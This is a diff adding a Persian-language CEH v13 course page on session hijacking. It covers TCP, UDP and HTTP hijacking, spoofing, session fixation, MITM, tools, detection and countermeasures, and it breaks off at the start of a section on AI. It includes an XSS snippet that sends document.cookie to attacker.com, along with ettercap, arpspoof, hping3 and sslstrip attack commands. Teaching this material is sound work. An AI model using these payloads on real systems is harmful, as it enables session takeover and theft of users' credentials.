@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ماژول ۱۱ - Session Hijacking - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .toc {
+            background: #eef3f7;
+            padding: 15px 25px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            border-right: 4px solid #2a7de1;
+        }
+        .toc ul {
+            columns: 2;
+            list-style: none;
+            padding: 0;
+            margin: 10px 0;
+        }
+        .toc ul li {
+            margin: 6px 0;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: background 0.2s;
+        }
+        .toc ul li:hover {
+            background: #dce3ea;
+        }
+        .toc ul li a {
+            text-decoration: none;
+            color: #0b3b5c;
+            font-weight: 500;
+        }
+        .toc ul li a:hover {
+            color: #2a7de1;
+        }
+        .copy-btn {
+            background: #2a7de1;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+        }
+        .copy-btn:hover {
+            background: #1a5fb0;
+        }
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+        }
+        .code-block .copy-btn {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: #4a5a7a;
+        }
+        .code-block .copy-btn:hover {
+            background: #2a7de1;
+        }
+        @media (max-width: 768px) {
+            .toc ul { columns: 1; }
+        }
+        table tr:hover {
+            background: #e8f0fe !important;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../../../index.html">خانه</a> |
+            <a href="../index.html">ماژول‌ها</a>
+        </span>
+    </div>
+
+    <h1>📚 ماژول ۱۱ – Session Hijacking</h1>
+
+    <!-- ===== فهرست مطالب ===== -->
+    <div class="toc">
+        <strong>📑 فهرست مطالب (کلیک کنید):</strong>
+        <ul>
+            <li><a href="#intro">🔰 مقدمه – Session Hijacking چیست؟</a></li>
+            <li><a href="#session-basics">🔑 مفاهیم پایه جلسات</a></li>
+            <li><a href="#types">📌 انواع حملات Session Hijacking</a></li>
+            <li><a href="#phases">🔄 مراحل یک حمله Session Hijacking</a></li>
+            <li><a href="#tcp-hijacking">🔴 TCP Session Hijacking</a></li>
+            <li><a href="#udp-hijacking">🔵 UDP Session Hijacking</a></li>
+            <li><a href="#http-hijacking">🟢 HTTP Session Hijacking</a></li>
+            <li><a href="#spoofing-techniques">🎯 تکنیک‌های Spoofing</a></li>
+            <li><a href="#session-fixation">🔐 تثبیت جلسه (Session Fixation)</a></li>
+            <li><a href="#cookie-hijacking">🍪 ربودن کوکی (Cookie Hijacking)</a></li>
+            <li><a href="#man-in-the-middle">👤 حملات Man-in-the-Middle در Session Hijacking</a></li>
+            <li><a href="#tools">🛠️ ابزارهای Session Hijacking</a></li>
+            <li><a href="#detection">🔍 تشخیص Session Hijacking</a></li>
+            <li><a href="#countermeasures">🛡️ راه‌های مقابله با Session Hijacking</a></li>
+            <li><a href="#ai-hijacking">🤖 Session Hijacking با هوش مصنوعی</a></li>
+            <li><a href="#lab-exercise">🧪 کارگاه عملی</a></li>
+            <li><a href="#practice-exercises">📝 تمرین‌های عملی</a></li>
+            <li><a href="#glossary">📖 واژه‌نامه تخصصی</a></li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card" id="intro">
+        <h2>🔰 مقدمه – Session Hijacking چیست؟</h2>
+        <p>
+            <b>ربودن جلسه (Session Hijacking)</b> یکی از پیشرفته‌ترین و خطرناک‌ترین حملات سایبری است که در آن مهاجم با به سرقت بردن شناسه جلسه (Session ID) یک کاربر معتبر، کنترل جلسه او را به دست می‌گیرد. این حمله معمولاً پس از احراز هویت کاربر انجام می‌شود و مهاجم می‌تواند به جای کاربر، به سیستم دسترسی داشته باشد.
+        </p>
+        <p>
+            جلسه (Session) به مجموعه‌ای از تعاملات بین یک کاربر و یک سرور در یک بازه زمانی مشخص گفته می‌شود. پس از احراز هویت موفق، سرور یک شناسه جلسه (Session ID) به کاربر اختصاص می‌دهد که در کوکی مرورگر یا URL ذخیره می‌شود. مهاجم با ربودن این شناسه، می‌تواند هویت کاربر را جعل کند.
+        </p>
+        <p>
+            حملات Session Hijacking معمولاً در لایه‌های مختلف انجام می‌شوند:
+        </p>
+        <ul>
+            <li><b>لایه شبکه (Network Layer):</b> ربودن جلسات TCP/IP.</li>
+            <li><b>لایه برنامه (Application Layer):</b> ربودن کوکی‌ها، تثبیت جلسه، و حملات MITM.</li>
+        </ul>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> Session Hijacking یکی از جدی‌ترین تهدیدات امنیتی است. در هک قانونمند، این تکنیک فقط با مجوز و در محیط‌های کنترل‌شده استفاده می‌شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: مفاهیم پایه جلسات -->
+    <!-- ============================================================ -->
+    <div class="card" id="session-basics">
+        <h2>🔑 مفاهیم پایه جلسات (Session Basics)</h2>
+        <p>
+            برای درک Session Hijacking، ابتدا باید با مفاهیم پایه جلسات آشنا شوید:
+        </p>
+
+        <h3>📌 ۱. Session ID (شناسه جلسه)</h3>
+        <ul>
+            <li><b>تعریف:</b> یک رشته منحصربه‌فرد که برای شناسایی یک جلسه خاص استفاده می‌شود.</li>
+            <li><b>ذخیره‌سازی:</b> معمولاً در کوکی مرورگر، URL (به صورت پارامتر) یا در هدرهای HTTP.</li>
+            <li><b>اهمیت:</b> اگر مهاجم به Session ID دسترسی پیدا کند، می‌تواند جلسه را ربوده و هویت کاربر را جعل کند.</li>
+        </ul>
+
+        <h3>📌 ۲. Cookie (کوکی)</h3>
+        <ul>
+            <li><b>تعریف:</b> یک فایل کوچک متنی که توسط وب‌سایت در مرورگر کاربر ذخیره می‌شود.</li>
+            <li><b>نقش:</b> ذخیره اطلاعات جلسه، تنظیمات کاربر، و اطلاعات احراز هویت.</li>
+            <li><b>انواع کوکی:</b> Session Cookie (موقت)، Persistent Cookie (دائمی)، Secure Cookie (با رمزنگاری).</li>
+        </ul>
+
+        <h3>📌 ۳. انواع روش‌های مدیریت جلسه</h3>
+        <ul>
+            <li><b>کوکی‌ها (Cookies):</b> رایج‌ترین روش.</li>
+            <li><b>URL Rewriting:</b> اضافه کردن Session ID به URL.</li>
+            <li><b>Hidden Form Fields:</b> ذخیره Session ID در فیلدهای مخفی فرم‌ها.</li>
+            <li><b>HTTP Headers:</b> استفاده از هدرهای سفارشی برای انتقال Session ID.</li>
+        </ul>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> کوکی‌ها امن‌ترین روش مدیریت جلسه نیستند، به خصوص اگر تنظیمات امنیتی (مانند Secure و HttpOnly) روی آنها اعمال نشده باشد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: انواع حملات Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="types">
+        <h2>📌 انواع حملات Session Hijacking</h2>
+        <p>
+            حملات Session Hijacking بر اساس نحوه اجرا و لایه هدف به دو دسته کلی تقسیم می‌شوند:
+        </p>
+
+        <h3>🔍 ۱. حملات غیرفعال (Passive Hijacking)</h3>
+        <ul>
+            <li><b>تعریف:</b> مهاجم فقط جلسه را شنود می‌کند و هیچ بسته‌ای ارسال نمی‌کند.</li>
+            <li><b>روش:</b> Sniffing ترافیک شبکه برای دریافت Session ID.</li>
+            <li><b>مزایا:</b> مخفیانه و بدون ردپا.</li>
+            <li><b>معایب:</b> فقط در شبکه‌های غیرامن (مثل HTTP) کار می‌کند.</li>
+        </ul>
+
+        <h3>📡 ۲. حملات فعال (Active Hijacking)</h3>
+        <ul>
+            <li><b>تعریف:</b> مهاجم با ارسال بسته‌های خاص، جلسه را ربوده و کنترل آن را به دست می‌گیرد.</li>
+            <li><b>روش:</b> جعل بسته‌ها، تزریق کد، حملات MITM، Session Fixation.</li>
+            <li><b>مزایا:</b> در شبکه‌های مدرن (با رمزنگاری) قابل اجرا است.</li>
+            <li><b>معایب:</b> قابل تشخیص و ممکن است باعث اختلال در جلسه شود.</li>
+        </ul>
+
+        <h3>📌 ۳. بر اساس لایه</h3>
+        <ul>
+            <li><b>TCP Session Hijacking:</b> ربودن جلسات TCP با جعل بسته‌ها و تزریق کد.</li>
+            <li><b>UDP Session Hijacking:</b> ربودن جلسات UDP با جعل بسته‌ها.</li>
+            <li><b>HTTP Session Hijacking:</b> ربودن جلسات وب با استفاده از کوکی‌ها یا URL.</li>
+        </ul>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> حملات فعال بسیار خطرناک‌تر هستند و می‌توانند در شبکه‌های مدرن نیز اجرا شوند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: مراحل یک حمله Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="phases">
+        <h2>🔄 مراحل یک حمله Session Hijacking</h2>
+        <p>
+            یک حمله Session Hijacking معمولاً از مراحل زیر تشکیل می‌شود:
+        </p>
+        <ol>
+            <li><b>شناسایی هدف (Target Identification):</b> شناسایی یک کاربر معتبر و در حال استفاده از سرویس هدف.</li>
+            <li><b>شنود جلسه (Session Sniffing):</b> جمع‌آوری اطلاعات جلسه مانند Session ID, Cookie, و شماره دنباله TCP.</li>
+            <li><b>جعل هویت (Impersonation):</b> استفاده از اطلاعات جمع‌آوری شده برای جعل هویت کاربر.</li>
+            <li><b>ربودن جلسه (Session Hijacking):</b> قطع اتصال کاربر واقعی و ادامه جلسه با هویت جعلی.</li>
+            <li><b>بهره‌برداری (Exploitation):</b> استفاده از دسترسی به دست آمده برای انجام اقدامات مخرب.</li>
+        </ol>
+        <div class="highlight-box">
+            <b>💡 نکته:</b> موفقیت این حمله به شدت به کیفیت مرحله شنود و جمع‌آوری اطلاعات بستگی دارد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: TCP Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="tcp-hijacking">
+        <h2>🔴 TCP Session Hijacking</h2>
+        <p>
+            <b>TCP Session Hijacking</b> یکی از قدیمی‌ترین و معروف‌ترین تکنیک‌های Session Hijacking است که در آن مهاجم با جعل بسته‌های TCP، کنترل یک جلسه TCP فعال را به دست می‌گیرد.
+        </p>
+
+        <h3>📌 نحوه عملکرد:</h3>
+        <ol>
+            <li>مهاجم با استفاده از Sniffing، اطلاعات جلسه TCP (شماره دنباله، شماره تأیید، پورت‌ها) را جمع‌آوری می‌کند.</li>
+            <li>مهاجم یک بسته TCP جعلی به سرور ارسال می‌کند که به نظر می‌رسد از طرف کاربر معتبر ارسال شده است.</li>
+            <li>سرور با دریافت بسته جعلی، آن را به عنوان بخشی از جلسه فعلی پردازش می‌کند.</li>
+            <li>مهاجم با ارسال بسته RST به کاربر واقعی، اتصال او را قطع می‌کند.</li>
+            <li>مهاجم کنترل کامل جلسه را به دست می‌گیرد.</li>
+        </ol>
+
+        <h3>📌 ابزارهای TCP Session Hijacking:</h3>
+        <ul>
+            <li><b>Ettercap:</b> ابزار قدرتمند برای MITM و Session Hijacking.</li>
+            <li><b>Hunt:</b> ابزار تخصصی برای TCP Session Hijacking.</li>
+            <li><b>Juggernaut:</b> ابزار قدیمی اما مؤثر برای این کار.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از Ettercap برای TCP Session Hijacking
+ettercap -T -M arp:remote // // -P tcp_hijack
+
+# استفاده از Hunt برای ربودن جلسه
+hunt -i eth0</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> TCP Session Hijacking در شبکه‌های امروزی با استفاده از رمزنگاری (SSL/TLS) دشوارتر شده است، اما همچنان در شبکه‌های غیرامن یک تهدید جدی است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: UDP Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="udp-hijacking">
+        <h2>🔵 UDP Session Hijacking</h2>
+        <p>
+            <b>UDP Session Hijacking</b> مشابه TCP Session Hijacking است اما با این تفاوت که UDP بدون اتصال است و مکانیزم تأیید ندارد. این ویژگی UDP را نسبت به TCP آسیب‌پذیرتر می‌کند.
+        </p>
+
+        <h3>📌 نحوه عملکرد:</h3>
+        <ul>
+            <li>مهاجم با استفاده از Sniffing، اطلاعات جلسه UDP (پورت‌ها و محتوا) را جمع‌آوری می‌کند.</li>
+            <li>مهاجم یک بسته UDP جعلی به سرور ارسال می‌کند که به نظر می‌رسد از طرف کاربر معتبر ارسال شده است.</li>
+            <li>از آنجا که UDP بدون اتصال است و شماره دنباله ندارد، سرور نمی‌تواند بسته جعلی را از بسته واقعی تشخیص دهد.</li>
+            <li>مهاجم می‌تواند داده‌های جعلی را به سرور ارسال کند یا پاسخ‌های سرور را شنود کند.</li>
+        </ul>
+
+        <h3>📌 پروتکل‌های آسیب‌پذیر UDP:</h3>
+        <ul>
+            <li><b>DNS:</b> حملات DNS Spoofing.</li>
+            <li><b>SNMP:</b> تغییر تنظیمات شبکه.</li>
+            <li><b>NTP:</b> حملات بازتابی و تقویتی.</li>
+            <li><b>DHCP:</b> حملات DHCP Spoofing.</li>
+        </ul>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> UDP به دلیل عدم وجود مکانیزم تأیید، یکی از آسیب‌پذیرترین پروتکل‌ها برای Session Hijacking است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: HTTP Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="http-hijacking">
+        <h2>🟢 HTTP Session Hijacking</h2>
+        <p>
+            <b>HTTP Session Hijacking</b> رایج‌ترین نوع Session Hijacking است که در آن مهاجم با ربودن کوکی جلسه یا Session ID، کنترل جلسه وب کاربر را به دست می‌گیرد.
+        </p>
+
+        <h3>📌 روش‌های HTTP Session Hijacking:</h3>
+        <ul>
+            <li><b>سرقت کوکی (Cookie Theft):</b> از طریق Sniffing، XSS، یا مهندسی اجتماعی.</li>
+            <li><b>تثبیت جلسه (Session Fixation):</b> تعیین Session ID از قبل برای کاربر.</li>
+            <li><b>Cross-Site Scripting (XSS):</b> تزریق کد جاوااسکریپت برای دزدیدن کوکی.</li>
+            <li><b>Man-in-the-Middle (MITM):</b> شنود و تغییر ترافیک HTTP.</li>
+        </ul>
+
+        <h3>📌 ابزارهای HTTP Session Hijacking:</h3>
+        <ul>
+            <li><b>Burp Suite:</b> برای دستکاری کوکی‌ها و جلسات.</li>
+            <li><b>OWASP ZAP:</b> ابزار تست امنیت وب.</li>
+            <li><b>Firefox Developer Tools:</b> بررسی و دستکاری کوکی‌ها.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از Burp Suite برای دستکاری کوکی
+# ۱. تنظیم Proxy در Burp
+# ۲. ضبط درخواست HTTP
+# ۳. تغییر مقدار Cookie در بخش Parameters
+# ۴. ارسال درخواست تغییر یافته به سرور</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> HTTP Session Hijacking به ویژه در وب‌سایت‌هایی که از HTTPS استفاده نمی‌کنند، بسیار رایج است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: تکنیک‌های Spoofing -->
+    <!-- ============================================================ -->
+    <div class="card" id="spoofing-techniques">
+        <h2>🎯 تکنیک‌های Spoofing در Session Hijacking</h2>
+        <p>
+            Spoofing یکی از تکنیک‌های کلیدی در Session Hijacking است که در آن مهاجم آدرس IP، MAC، یا شناسه جلسه خود را جعل می‌کند.
+        </p>
+
+        <h3>📌 انواع Spoofing:</h3>
+        <ul>
+            <li><b>IP Spoofing:</b> جعل آدرس IP مبدأ برای فریب سیستم‌ها.</li>
+            <li><b>MAC Spoofing:</b> جعل آدرس MAC برای دور زدن کنترل‌های دسترسی.</li>
+            <li><b>ARP Spoofing:</b> جعل جدول ARP برای هدایت ترافیک به مهاجم (MITM).</li>
+            <li><b>DNS Spoofing:</b> جعل پاسخ‌های DNS برای هدایت کاربران به وب‌سایت‌های جعلی.</li>
+            <li><b>Cookie Spoofing:</b> جعل کوکی جلسه برای ربودن جلسه.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># ARP Spoofing با arpspoof
+arpspoof -i eth0 -t 192.168.1.101 192.168.1.1
+
+# IP Spoofing با hping3
+hping3 -S -p 80 -a 192.168.1.102 192.168.1.101</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> Spoofing معمولاً اولین گام برای اجرای حملات Session Hijacking است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: Session Fixation -->
+    <!-- ============================================================ -->
+    <div class="card" id="session-fixation">
+        <h2>🔐 تثبیت جلسه (Session Fixation)</h2>
+        <p>
+            <b>Session Fixation</b> یک تکنیک پیشرفته در Session Hijacking است که در آن مهاجم یک Session ID از پیش تعیین‌شده را به کاربر تحمیل می‌کند و پس از احراز هویت کاربر، از همان Session ID برای ربودن جلسه استفاده می‌کند.
+        </p>
+
+        <h3>📌 مراحل حمله Session Fixation:</h3>
+        <ol>
+            <li>مهاجم یک Session ID معتبر از سرور دریافت می‌کند (مثلاً با بازدید از وب‌سایت).</li>
+            <li>مهاجم کاربر را فریب می‌دهد تا با همان Session ID وارد سیستم شود (از طریق لینک، ایمیل، یا XSS).</li>
+            <li>کاربر با Session ID تعیین‌شده توسط مهاجم وارد سیستم می‌شود.</li>
+            <li>مهاجم با استفاده از همان Session ID به جلسه کاربر دسترسی پیدا می‌کند.</li>
+        </ol>
+
+        <h3>📌 مثال‌های Session Fixation:</h3>
+        <ul>
+            <li>ارسال لینک با Session ID در URL: <code dir='ltr'>https://example.com/login?sessionid=12345</code></li>
+            <li>استفاده از XSS برای تنظیم کوکی Session ID.</li>
+            <li>استفاده از مهندسی اجتماعی برای فریب کاربر به کلیک روی لینک.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> Session Fixation یکی از خطرناک‌ترین تکنیک‌های Session Hijacking است و بسیاری از وب‌سایت‌ها هنوز در برابر آن آسیب‌پذیرند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: Cookie Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="cookie-hijacking">
+        <h2>🍪 ربودن کوکی (Cookie Hijacking)</h2>
+        <p>
+            <b>Cookie Hijacking</b> یکی از رایج‌ترین روش‌های HTTP Session Hijacking است که در آن مهاجم با سرقت کوکی جلسه کاربر، کنترل جلسه را به دست می‌گیرد.
+        </p>
+
+        <h3>📌 روش‌های ربودن کوکی:</h3>
+        <ul>
+            <li><b>Sniffing:</b> شنود ترافیک HTTP برای دریافت کوکی.</li>
+            <li><b>XSS (Cross-Site Scripting):</b> تزریق کد جاوااسکریپت برای خواندن کوکی.</li>
+            <li><b>Cross-Site Request Forgery (CSRF):</b> استفاده از کوکی برای انجام اقدامات غیرمجاز.</li>
+            <li><b>Session Fixation:</b> تحمیل یک کوکی خاص به کاربر.</li>
+            <li><b>مهندسی اجتماعی:</b> فریب کاربر برای افشای کوکی.</li>
+        </ul>
+
+        <h3>📌 مثال XSS برای ربودن کوکی:</h3>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'>&lt;script&gt;
+    fetch('http://attacker.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> استفاده از تنظیمات <code dir='ltr'>HttpOnly</code> و <code dir='ltr'>Secure</code> در کوکی‌ها می‌تواند از ربودن کوکی جلوگیری کند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۱: حملات MITM در Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="man-in-the-middle">
+        <h2>👤 حملات Man-in-the-Middle (MITM) در Session Hijacking</h2>
+        <p>
+            حملات MITM یکی از مؤثرترین روش‌ها برای Session Hijacking هستند که در آنها مهاجم بین کاربر و سرور قرار می‌گیرد و ترافیک را شنود، تغییر یا مسدود می‌کند.
+        </p>
+
+        <h3>📌 انواع حملات MITM در Session Hijacking:</h3>
+        <ul>
+            <li><b>SSL Stripping:</b> کاهش امنیت HTTPS به HTTP.</li>
+            <li><b>ARP Spoofing:</b> هدایت ترافیک به مهاجم.</li>
+            <li><b>DNS Spoofing:</b> هدایت کاربران به وب‌سایت‌های جعلی.</li>
+            <li><b>Session Hijacking:</b> ربودن جلسه با استفاده از اطلاعات شنود شده.</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از ettercap برای MITM
+ettercap -T -M arp:remote /192.168.1.101// /192.168.1.1//
+
+# استفاده از sslstrip برای SSL Stripping
+sslstrip -l 8080</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> حملات MITM یکی از خطرناک‌ترین تهدیدات امنیتی هستند و می‌توانند اطلاعات بسیار حساسی را به سرقت ببرند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۲: ابزارهای Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="tools">
+        <h2>🛠️ ابزارهای Session Hijacking</h2>
+        <p>
+            ابزارهای متعددی برای اجرای Session Hijacking وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>ابزار</th><th>نوع حمله</th><th>توضیح</th></tr>
+                <tr>
+                    <td><b>Ettercap</b></td>
+                    <td>MITM, ARP Spoofing, TCP Hijacking</td>
+                    <td>ابزار قدرتمند برای حملات MITM و Session Hijacking</td>
+                </tr>
+                <tr>
+                    <td><b>Burp Suite</b></td>
+                    <td>HTTP Session Hijacking</td>
+                    <td>دستکاری کوکی‌ها و جلسات وب</td>
+                </tr>
+                <tr>
+                    <td><b>OWASP ZAP</b></td>
+                    <td>HTTP Session Hijacking</td>
+                    <td>ابزار تست امنیت وب با قابلیت دستکاری جلسات</td>
+                </tr>
+                <tr>
+                    <td><b>Hunt</b></td>
+                    <td>TCP Session Hijacking</td>
+                    <td>ابزار تخصصی برای ربودن جلسات TCP</td>
+                </tr>
+                <tr>
+                    <td><b>Juggernaut</b></td>
+                    <td>TCP Session Hijacking</td>
+                    <td>ابزار قدیمی اما مؤثر برای TCP Hijacking</td>
+                </tr>
+                <tr>
+                    <td><b>Cookie Cadger</b></td>
+                    <td>Cookie Hijacking</td>
+                    <td>شنود و ربودن کوکی‌ها از ترافیک HTTP</td>
+                </tr>
+                <tr>
+                    <td><b>Hamster</b></td>
+                    <td>Cookie Hijacking</td>
+                    <td>ابزار گرافیکی برای ربودن کوکی‌ها</td>
+                </tr>
+                <tr>
+                    <td><b>Ferret</b></td>
+                    <td>Cookie Hijacking</td>
+                    <td>شنود و استخراج کوکی‌ها از ترافیک</td>
+                </tr>
+                <tr>
+                    <td><b>BetterCAP</b></td>
+                    <td>MITM, ARP Spoofing</td>
+                    <td>نسخه مدرن Ettercap با قابلیت‌های بیشتر</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> Burp Suite و Ettercap دو تا از محبوب‌ترین ابزارهای Session Hijacking هستند.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۳: تشخیص Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="detection">
+        <h2>🔍 تشخیص Session Hijacking</h2>
+        <p>
+            تشخیص به‌موقع حملات Session Hijacking می‌تواند از خسارت‌های بزرگ جلوگیری کند. در ادامه، روش‌های تشخیص این حملات را معرفی می‌کنیم:
+        </p>
+
+        <h3>📌 نشانه‌های یک حمله Session Hijacking:</h3>
+        <ul>
+            <li>تغییرات غیرعادی در رفتار کاربر (مثل درخواست‌های غیرمعمول).</li>
+            <li>ورود همزمان از دو مکان مختلف با یک حساب کاربری.</li>
+            <li>انصراف ناگهانی از جلسه (Session Timeout).</li>
+            <li>تغییر تنظیمات حساب کاربری بدون اطلاع کاربر.</li>
+            <li>درخواست‌های HTTP با Session IDهای تکراری یا غیرعادی.</li>
+        </ul>
+
+        <h3>📌 ابزارهای تشخیص Session Hijacking:</h3>
+        <ul>
+            <li><b>IDS/IPS:</b> مانند Snort و Suricata.</li>
+            <li><b>SIEM:</b> تحلیل لاگ‌ها و تشخیص ناهنجاری‌ها.</li>
+            <li><b>Wireshark:</b> تحلیل ترافیک شبکه برای یافتن بسته‌های مشکوک.</li>
+            <li><b>راه‌حل‌های امنیتی وب:</b> مانند WAF (Web Application Firewall).</li>
+        </ul>
+
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از Snort برای تشخیص ARP Spoofing
+snort -i eth0 -c /etc/snort/snort.conf -A console
+
+# بررسی لاگ‌های سرور برای Session IDهای مشکوک
+grep "sessionid" /var/log/apache2/access.log</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> ترکیب چند روش تشخیص، دقت را به شدت افزایش می‌دهد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۴: راه‌های مقابله با Session Hijacking -->
+    <!-- ============================================================ -->
+    <div class="card" id="countermeasures">
+        <h2>🛡️ راه‌های مقابله با Session Hijacking (Countermeasures)</h2>
+        <p>
+            برای جلوگیری از حملات Session Hijacking، سازمان‌ها و توسعه‌دهندگان باید اقدامات زیر را انجام دهند:
+        </p>
+
+        <h3>📌 اقدامات کلی:</h3>
+        <ul>
+            <li><b>استفاده از HTTPS:</b> رمزنگاری تمام ارتباطات وب.</li>
+            <li><b>تنظیمات امن کوکی:</b>
+                <ul>
+                    <li><b>Secure Flag:</b> کوکی فقط از طریق HTTPS ارسال شود.</li>
+                    <li><b>HttpOnly Flag:</b> کوکی از طریق جاوااسکریپت قابل دسترسی نباشد.</li>
+                    <li><b>SameSite Flag:</b> جلوگیری از ارسال کوکی در درخواست‌های Cross-Site.</li>
+                </ul>
+            </li>
+            <li><b>استفاده از Session IDهای قوی:</b> تولید Session IDهای طولانی، تصادفی و غیرقابل پیش‌بینی.</li>
+            <li><b>تنظیم Timeout برای جلسات:</b> پایان دادن خودکار به جلسات پس از مدت زمان مشخص.</li>
+            <li><b>تغییر Session ID پس از احراز هویت:</b> ایجاد Session ID جدید پس از ورود موفق.</li>
+            <li><b>استفاده از احراز هویت چندعاملی (MFA):</b> اضافه کردن لایه‌های امنیتی بیشتر.</li>
+            <li><b>آموزش کاربران:</b> آگاهی‌بخشی درباره خطرات کلیک روی لینک‌های ناشناس.</li>
+        </ul>
+
+        <h3>📌 اقدامات خاص برای هر نوع حمله:</h3>
+        <ul>
+            <li><b>در برابر TCP Hijacking:</b> استفاده از IPsec یا رمزنگاری لایه شبکه.</li>
+            <li><b>در برابر Session Fixation:</b> تغییر Session ID پس از ورود، عدم پذیرش Session ID از URL.</li>
+            <li><b>در برابر XSS:</b> فیلتر کردن ورودی‌ها، استفاده از Content Security Policy (CSP).</li>
+            <li><b>در برابر MITM:</b> استفاده از HTTPS با گواهی‌های معتبر، استفاده از HSTS.</li>
+            <li><b>در برابر Sniffing:</b> استفاده از شبکه‌های امن (VPN).</li>
+        </ul>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> بهترین دفاع در برابر Session Hijacking، ترکیبی از رمزنگاری، تنظیمات امن کوکی و آموزش کاربران است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۵: Session Hijacking با هوش مصنوعی -->
+    <!-- ============================================================ -->
+    <div class="card" id="ai-hijacking">
+        <h2>🤖 Session Hijacking با هوش مصنوعی</h2>
+        <p>
+            CEH v13 به عنوان <b>اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده</b>، به نقش هوش مصنوعی در Session Hijacking نیز می‌پردازد.
+        </p>
+
+        <h3>📌 نقش هوش مصنوعی در Session Hijacking:</h3>
+        <ul>
